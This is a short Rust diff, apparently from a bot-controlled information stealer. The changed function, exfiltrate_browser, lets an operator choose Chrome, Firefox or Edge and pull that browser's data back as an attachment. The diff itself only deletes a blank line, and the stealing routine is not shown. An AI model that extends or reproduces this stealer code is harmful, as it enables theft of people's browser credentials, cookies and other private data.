@@ -35,7 +35,6 @@ pub async fn exfiltrate_browser(
 	ctx: Context<'_>,
 	#[description = "A supported browser (chrome, firefox, edge)"] browser: BrowserChoice,
 ) -> Result<(), Error> {
-
 	// Attempt to create the attachment, given the browser choice.
 	let attachment = match browser.as_str() {
 		"Chrome" => exfiltrate("Chrome").await,
